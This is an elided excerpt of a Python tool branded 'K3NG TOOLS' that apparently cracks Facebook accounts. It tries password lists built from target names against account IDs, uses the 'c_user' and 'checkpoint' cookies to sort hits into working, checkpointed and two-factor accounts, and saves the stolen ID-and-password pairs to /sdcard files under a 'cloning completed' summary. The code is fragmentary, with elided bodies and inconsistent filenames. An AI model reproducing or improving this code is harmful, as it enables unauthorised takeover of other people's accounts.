...
def main():
    ...
    print(f'{BLUE}══════════════════════════════════════════════════════')
    print("           \x1b[97m[\033[37;41m  WELCOME. TO K3NG TOOLS \033[0;m] ")
...
def method1(ids,names,passlist,total_ids):
    ...
    whi = '\033[0;97m'
    sys.stdout.write(f'\r%s {WHITE}[K3NG 🔥]%s[%s] [OK:%s CP:%s 2F:%s]'%(rr,whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        first = names.split(' ')[0]
        try:
            last = names.split(' ')[1]
...
def method2(ids,names,passlist,total_ids):
    ...
    try:
        ...
        for fikr in passlist:
            ...
            if 'c_user' in cookies:
                os.system("play-audio K3NG_OK.mp3")
                print('\r\033[1;32m[K3NG-OK] '+ids+' | '+pas+'\033[0;97m')
                ok.append(ids)
                open('/sdcard/K3NG_OK.txt', 'a').write(ids+' | '+pas+'\n')
                break
            elif 'checkpoint' in cookies:
                d = re.search('<\W*title\W*(.*)</title',post_request,re.IGNORECASE)
                #print(d.group(1))
                if 'Enter login code to continue' in str(d.group(1)):
                    os.system("play-audio K3NG_2F.mp3")
                    print('\r\033[1;35m[K3NG-2F] '+ids+' | '+pas+'\033[0;97m')
                    tf.append(ids)
                    open('/sdcard/K3NG_2F.txt', 'a').write(ids+' | '+pas+'\n')
                    break
                else:
                    os.system("play-audio K3NG_CP.mp3")
                    print('\r\033[1;31m[K3NG-CP] '+ids+' | '+pas+'\033[0;97m')
                    cp.append(ids)
                    open('/sdcard/HAMII_CP.txt', 'a').write(ids+' | '+pas+'\n')
                    break
            else:continue
...
def random_method(ids,passlist,total_ids):
    ...
    rr = random.choice(rcol)
    whi = '\033[0;97m'
    sys.stdout.write(f'\r{WHITE}[K3NG 🔥]%s [%s] [OK:%s CP:%s 2F:%s]'%(whi,loop,len(ok),len(cp),len(tf)));sys.stdout.flush()
    try:
        for pas in passlist:
...
def pass1():
    ...
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/KING-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/K3NG-CP.txt')
...
def pass2():
    ...
    print('\x1b[38;5;46m[∆] CLONING COMPLETED\n[√] YOUR OK IDS : '+str(len(ok))+'\n\x1b[38;5;196m[×] YOUR CP IDS : '+str(len(cp)))
    print(f'\n[~]{RED}===================================================')
    print('\x1b[38;5;46m[√] OK IDS SAVE : /sdcard/K3NG-OK.txt\n\x1b[38;5;196m[×] CP IDS SAVE : /sdcard/K3NG-CP.txt')
    input(f'{GREEN}[>] PRESS ENTER TO BACK MENU   ');os.system("clear");main()
